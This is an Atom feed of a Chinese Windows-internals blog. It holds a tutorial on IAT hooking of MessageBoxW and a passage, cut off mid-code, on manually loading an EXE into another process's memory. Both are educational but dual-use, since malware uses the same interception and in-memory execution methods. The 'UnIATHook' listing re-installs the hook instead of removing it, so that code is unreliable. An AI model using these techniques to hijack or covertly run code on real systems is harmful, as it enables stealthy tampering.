<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>杂毛小鸡</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bigkan.github.io/"/>
  <updated>2020-08-03T13:18:08.414Z</updated>
  <id>https://bigkan.github.io/</id>
  
  <author>
    <name>杂毛小鸡</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IAT Hook</title>
    <link href="https://bigkan.github.io/2020/08/03/IAT-Hook/"/>
    <id>https://bigkan.github.io/2020/08/03/IAT-Hook/</id>
    <published>2020-08-03T12:04:37.000Z</published>
    <updated>2020-08-03T13:18:08.414Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>这篇博客主要记录IAT Hook的基本原理和简单实现。</p><ul><li>1.IAT Hook的原理</li><li>2.AT HOOK的实现<a id="more"></a></li></ul></blockquote><h1 id="IAT-HOOK原理"><a href="#IAT-HOOK原理" class="headerlink" title="IAT HOOK原理"></a>IAT HOOK原理</h1><p>IAT HOOK的原理比较容易理解，就是将IAT表中记录的函数地址换成自己的函数地址。如下图将函数n地址替换为HookProc函数的地址，当程序调用函数n时就会调用HookProc。如果想要在执行完Hook函数后再想调用函数n，不能直接调用函数n，因为此时地址已经被覆盖所以会调用HookProc导致死循环，而是需要使用LoadLibrary和GetProcAddress来获得函数n的地址。</p><p><img src="/2020/08/03/IAT-Hook/IATHook.png" alt="IATHook原理"></p><h1 id="IAT-Hook代码实现"><a href="#IAT-Hook代码实现" class="headerlink" title="IAT Hook代码实现"></a>IAT Hook代码实现</h1><p>代码主要内容就是IAT表的遍历和字符串比较</p><h2 id="SetIATHook"><a href="#SetIATHook" class="headerlink" title="SetIATHook"></a>SetIATHook</h2><p>实现对MessageBoxW的IATHook。</p><ul><li>1.GetModuleHandle(NULL)获取到当前进程的基址，</li><li>2.循环遍历IMAGE_IMPORT_DESCRIPTO结构体，将Name与USR32.dll进行比较</li><li>3.循环遍历INT表与MessageBoxW进行比较（需要注意INT表的结构），得到函数在IAT表中的index。</li><li>4.修改IAT表地址<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetIATHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hMod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">PBYTE pData = (PBYTE)hMod;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;</span><br><span class="line">    PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((BYTE*)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOptHeader = &amp;pNTHeader-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR impTable = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pDosHeader+pOptHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* DLLName = <span class="string">"USER32.dll"</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* Message = <span class="string">"MessageBoxW"</span>;</span><br><span class="line"><span class="keyword">if</span> (impTable-&gt;TimeDateStamp == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (impTable-&gt;OriginalFirstThunk == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"没有导入表"</span>, <span class="string">L"信息提示"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环导出表结构体，遍历所要调用的所有PE模块 判断结构标记</span></span><br><span class="line"><span class="keyword">while</span> (impTable-&gt;OriginalFirstThunk != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span>*)(pData + impTable-&gt;Name), DLLName))</span><br><span class="line">&#123;</span><br><span class="line">_IMAGE_THUNK_DATA32* IntThunkData = (_IMAGE_THUNK_DATA32*)(pData + impTable-&gt;OriginalFirstThunk);</span><br><span class="line">_IMAGE_THUNK_DATA32* IatThunkData = (_IMAGE_THUNK_DATA32*)(pData + impTable-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断INT表结束标记</span></span><br><span class="line"><span class="keyword">while</span> (IntThunkData-&gt;u1.Ordinal != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span>*)(pData + IntThunkData-&gt;u1.Ordinal+<span class="number">2</span>), Message))</span><br><span class="line">&#123;</span><br><span class="line">PDWORD addTemp = (PDWORD)IatThunkData;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line">VirtualProtect((LPVOID)&amp;IatThunkData-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">*addTemp = (DWORD)MyMessageBox;</span><br><span class="line">&#125;</span><br><span class="line">IntThunkData++;</span><br><span class="line">IatThunkData++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//指向下一个导入表 结构体</span></span><br><span class="line">impTable++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"使用绑定导入表"</span>, <span class="string">L"信息提示"</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="HooKProc"><a href="#HooKProc" class="headerlink" title="HooKProc"></a>HooKProc</h2><p>用于替换IAT表中的函数，可以在这里面对参数进行修改检测等。不知道为什么中文乱码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DWORD g_OldFuncAddr = (DWORD)GetProcAddress(LoadLibrary(<span class="string">L"USER32.dll"</span>),<span class="string">"MessageBoxW"</span>);</span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBox</span><span class="params">(HWND hWnd, LPCWSTR lpText,LPCWSTR lpCaption,UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *OldMessageBox)</span><span class="params">(HWND, LPCWSTR, LPCWSTR, UINT)</span></span>;</span><br><span class="line">wprintf(<span class="string">L"Hello\n"</span>);</span><br><span class="line">wprintf(<span class="string">L"%x\t"</span>, hWnd);</span><br><span class="line">wprintf(<span class="string">L"%ls\t"</span>, <span class="string">L"中文无法输出吗"</span>);</span><br><span class="line">wprintf(<span class="string">L"%ls\t"</span>, lpCaption);</span><br><span class="line">wprintf(<span class="string">L"%d\n"</span>, uType);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = ((OldMessageBox)g_OldFuncAddr)(hWnd,lpText,lpCaption,uType);</span><br><span class="line">    wprintf(<span class="string">L"返回值：%d\n"</span>, ret);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="UnIATHook"><a href="#UnIATHook" class="headerlink" title="UnIATHook"></a>UnIATHook</h2><p>取消IAT HOOK。整体流程类似SetIATHOOk,也可以用全局变量来记录修改的位置，方便后面取消IAT HOOk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnIATHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HMODULE hMod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">PBYTE pData = (PBYTE)hMod;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;</span><br><span class="line">PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((BYTE*)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOptHeader = &amp;pNTHeader-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR impTable = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pDosHeader + pOptHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* DLLName = <span class="string">"USER32.dll"</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* Message = <span class="string">"MessageBoxW"</span>;</span><br><span class="line"><span class="keyword">if</span> (impTable-&gt;TimeDateStamp == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (impTable-&gt;OriginalFirstThunk == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"没有导入表"</span>, <span class="string">L"信息提示"</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环导出表结构体，遍历所要调用的所有PE模块 判断结构标记</span></span><br><span class="line"><span class="keyword">while</span> (impTable-&gt;OriginalFirstThunk != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span>*)(pData + impTable-&gt;Name), DLLName))</span><br><span class="line">&#123;</span><br><span class="line">_IMAGE_THUNK_DATA32* IntThunkData = (_IMAGE_THUNK_DATA32*)(pData + impTable-&gt;OriginalFirstThunk);</span><br><span class="line">_IMAGE_THUNK_DATA32* IatThunkData = (_IMAGE_THUNK_DATA32*)(pData + impTable-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断INT表结束标记</span></span><br><span class="line"><span class="keyword">while</span> (IntThunkData-&gt;u1.Ordinal != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span>*)(pData + IntThunkData-&gt;u1.Ordinal + <span class="number">2</span>), Message))</span><br><span class="line">&#123;</span><br><span class="line">PDWORD addTemp = (PDWORD)IatThunkData;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line">VirtualProtect((LPVOID)&amp;IatThunkData-&gt;u1.Function, <span class="number">4</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">*addTemp = (DWORD)MyMessageBox;</span><br><span class="line">&#125;</span><br><span class="line">IntThunkData++;</span><br><span class="line">IatThunkData++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//指向下一个导入表 结构体</span></span><br><span class="line">impTable++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L"使用绑定导入表"</span>, <span class="string">L"信息提示"</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><ul><li>IATHook的优点：简单容易实现，可以对函数调用进行监控</li><li>IATHook的缺点：只能Hook IAT表中存在的函数。如果程序使用Loadlibrary和GetProcAddress来调用函数将失效。无法Hook没有导出的函数，也不能对任意的位置进行Hook</li></ul><p>代码链接：<a href="https://github.com/bigkan/BlogDemo" target="_blank" rel="noopener">https://github.com/bigkan/BlogDemo</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;这篇博客主要记录IAT Hook的基本原理和简单实现。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.IAT Hook的原理&lt;/li&gt;
&lt;li&gt;2.AT HOOK的实现&lt;/li&gt;&lt;/ul&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Hook Windows 基础 安全" scheme="https://bigkan.github.io/tags/Hook-Windows-%E5%9F%BA%E7%A1%80-%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内存加载运行EXE</title>
    <link href="https://bigkan.github.io/2020/07/24/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8CEXE/"/>
    <id>https://bigkan.github.io/2020/07/24/内存加载运行EXE/</id>
    <published>2020-07-24T13:00:50.000Z</published>
    <updated>2020-07-24T18:21:16.368Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>如何将其他程序加载到内存中运行？有点类似exe加载器。A.exe将B.exe加载到内存中运行需要几步？只需要4步</p><ul><li>第一步：将B.exe读取到内存中并拉伸</li><li>第二步：修复B.exe的IAT表</li><li>第三步：修复B.exe的重定位表</li><li>第四步：运行B.exe</li></ul></blockquote><a id="more"></a><h1 id="一、将B-exe读取到内存并拉伸"><a href="#一、将B-exe读取到内存并拉伸" class="headerlink" title="一、将B.exe读取到内存并拉伸"></a>一、将B.exe读取到内存并拉伸</h1><p>要将B.exe加载到A.exe中运行，第一步当然是要将B加载到A的内存中并按照IMAGE_SECTION_HEADER对B进行拉伸。</p><p><img src="/2020/07/24/内存加载运行EXE/FileToMem.png" alt="文件加载到内存"></p><h3 id="1-将B-exe读取到内存中"><a href="#1-将B-exe读取到内存中" class="headerlink" title="1. 将B.exe读取到内存中"></a>1. 将B.exe读取到内存中</h3><p>将B.exe整个读入到A.exe的内存中。这里就不放代码了。</p><h3 id="2-计算B-exe需要的内存大小"><a href="#2-计算B-exe需要的内存大小" class="headerlink" title="2. 计算B.exe需要的内存大小"></a>2. 计算B.exe需要的内存大小</h3><p>第一种方法，在PE OptionalHeader的SizeOfImage记录有内存占用大小。</p><p>第二种方法，可以通过最后一个SectionHeader的VirtualAddress加上内存对齐后的SizeOfRawData得到另一个内存占用大小。</p><p>取两个方法中较大的那个作为内存占用大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//内存镜像大小</span></span><br><span class="line">DWORD size_image = OptionalHeader-&gt;SizeOfImage;</span><br><span class="line"><span class="comment">//计算最后一个节内存对齐后需要多大空间</span></span><br><span class="line"><span class="keyword">int</span> size = last_section.SizeOfRawData / mem_Alignment;</span><br><span class="line">size = (size + (last_section.SizeOfRawData % mem_Alignment == <span class="number">0</span> ? <span class="number">0</span> : <span class="number">1</span>)) * mem_Alignment;</span><br><span class="line">SIZE_T fileBufferSize = last_section.VirtualAddress + size;</span><br><span class="line"><span class="comment">//比较大小</span></span><br><span class="line">fileBufferSize = size_image &gt; fileBufferSize ? size_image : fileBufferSize;</span><br><span class="line"><span class="comment">//开辟空间</span></span><br><span class="line">*i_buff = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(fileBufferSize);</span><br></pre></td></tr></table></figure><h3 id="3-根据sectionHeader对PE进行拉伸"><a href="#3-根据sectionHeader对PE进行拉伸" class="headerlink" title="3. 根据sectionHeader对PE进行拉伸"></a>3. 根据sectionHeader对PE进行拉伸</h3><p>下面是IMAGE_SECTION_HEADER结构体，其中最重要的是VirtualAddress：相对偏移地址（RVA）用于计算节复制的目的地址。SizeOfRawData:节在文本中的大小，用于计算内存对齐后的大小。PointerToRawData：文本中的相对偏移（FOA）用于计算复制节的源地址。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;             <span class="comment">//内存中的相对偏移地址，RVA地址</span></span><br><span class="line">    DWORD   SizeOfRawData;              <span class="comment">//未拉伸时节大小</span></span><br><span class="line">    DWORD   PointerToRawData;           <span class="comment">//文本中节的相对偏移地址，FOA地址</span></span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure></p><p>循环将节从FileBuff中复制到ImageBuff<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD vAddr = section_header[i].VirtualAddress;</span><br><span class="line">DWORD point_section = section_header[i].PointerToRawData;</span><br><span class="line">DWORD size_section = section_header[i].SizeOfRawData;</span><br><span class="line"><span class="comment">//计算内存对齐后的大小</span></span><br><span class="line"><span class="keyword">if</span> (size_section % mem_Alignment != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">section_header[i].SizeOfRawData = (size_section / mem_Alignment + (size_section % mem_Alignment == <span class="number">0</span> ? <span class="number">0</span> : <span class="number">1</span>)) * mem_Alignment;</span><br><span class="line">&#125;</span><br><span class="line">section_header[i].PointerToRawData = vAddr;</span><br><span class="line">    <span class="comment">//从thePeHeaders-&gt;fileBuff + point_section复制size_section到temp_ibuff + vAddr中</span></span><br><span class="line"><span class="built_in">memcpy</span>(temp_ibuff + vAddr, thePeHeaders-&gt;fileBuff + point_section, size_section);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*拷贝头部信息， 后面两种方式都可以</span></span><br><span class="line"><span class="comment">1.取出可选PE头中的 header大小描述 _nt_header-&gt;OptionalHeader.SizeOfHeaders</span></span><br><span class="line"><span class="comment">2.判断第一个节的文件偏移位置 _section_header[0].PointerToRawData</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">DWORD header_offset = section_header[<span class="number">0</span>].PointerToRawData;</span><br><span class="line"><span class="built_in">memcpy</span>(temp_ibuff, thePeHeaders-&gt;fileBuff, header_offset);</span><br></pre></td></tr></table></figure></p><h3 id="4-VirtualAlloc"><a href="#4-VirtualAlloc" class="headerlink" title="4. VirtualAlloc"></a>4. VirtualAlloc</h3><p>根据ImageBase和之前计算的拉伸后PE大小，VirtualAlloc开辟空间，并将上一步拉伸的PE复制到新开辟的空间中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CHAR* vir = (CHAR*)VirtualAlloc((LPVOID)imageBase, sizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (vir == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L"内存申请失败!"</span>, <span class="string">L"信息提示"</span>, MB_ICONERROR);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(vir, imageBuff, sizeOfImage);</span><br></pre></td></tr></table></figure></p><h1 id="二、修复IAT表"><a href="#二、修复IAT表" class="headerlink" title="二、修复IAT表"></a>二、修复IAT表</h1><p>当PE程序使用其他DLL时需要将DLL加载到内存中并获得需要使用函数的地址。PE文件加载时，会根据导入表将程序需要的DLL加载到内存中，并将对应函数的地址填入到IAT表中。这里由于是我们自己加载拉伸的PE所以拉伸后的IAT表并没有修复，需要我们手动进行。</p><p>在PE加载前导入表的状态如下图所示，IAT表中记录的内容和INT记录的内容相同</p><p><img src="/2020/07/24/内存加载运行EXE/IAT1.png" alt="文件加载到内存"></p><p>在PE加载后导入表的状态如下图所示，IAT表将记录DLL中导入的函数地址</p><p><img src="/2020/07/24/内存加载运行EXE/IAT2.png" alt="文件加载到内存"></p><h3 id="1-遍历IMAGE-IMPORT-DESCRIPTOR表"><a href="#1-遍历IMAGE-IMPORT-DESCRIPTOR表" class="headerlink" title="1. 遍历IMAGE_IMPORT_DESCRIPTOR表"></a>1. 遍历IMAGE_IMPORT_DESCRIPTOR表</h3><p>每个IMAGE_IMPORT_DESCRIPTOR结构描述了一个需要导入的DLL。其中最重要的是OriginalFirstThunk：指向INT表，用于GetProcAddress获得对应函数地址。Name：指向需要DLL的名字，用于LoadLibraryA将DLL加载到内存中。FirstThunk：指向IAT表，需要将获得的函数地址填入到IAT表中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><h3 id="2-遍历INT表获取函数地址"><a href="#2-遍历INT表获取函数地址" class="headerlink" title="2. 遍历INT表获取函数地址"></a>2. 遍历INT表获取函数地址</h3><p>INT表指向的是需要使用的函数名字，需要遍历INT表通过GetProcAddress获得函数的地址,并将得到的函数地址填入到IAT表对应的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//循环导出表结构体，遍历所要调用的所有PE模块 判断结构标记</span></span><br><span class="line"><span class="keyword">while</span> (impTable-&gt;OriginalFirstThunk != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">_IMAGE_THUNK_DATA32* IntThunkData = (_IMAGE_THUNK_DATA32*)(pData + impTable-&gt;OriginalFirstThunk);</span><br><span class="line">_IMAGE_THUNK_DATA32* IatThunkData = (_IMAGE_THUNK_DATA32*)(pData + impTable-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历导入表  根据DLL名称加载DLL</span></span><br><span class="line">HMODULE dllModule = LoadLibraryA(pData + impTable-&gt;Name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断INT表结束标记</span></span><br><span class="line"><span class="keyword">while</span> (IntThunkData-&gt;u1.Ordinal != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//获取导入表的名字</span></span><br><span class="line">DWORD numOrName = IntThunkData-&gt;u1.Ordinal;</span><br><span class="line"><span class="comment">//取出标记 判断为序号导入还是名字导入</span></span><br><span class="line">DWORD flag = numOrName &amp; <span class="number">0x80000000</span>;</span><br><span class="line"></span><br><span class="line">PDWORD addTemp = (PDWORD)IatThunkData;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">0x80000000</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD number = numOrName &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line"><span class="comment">//序号导入</span></span><br><span class="line"><span class="comment">//修复导入表中按序号导入的函数地址</span></span><br><span class="line">DWORD funAddr = (DWORD)GetProcAddress(dllModule, MAKEINTRESOURCEA(number));</span><br><span class="line">*addTemp = funAddr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> 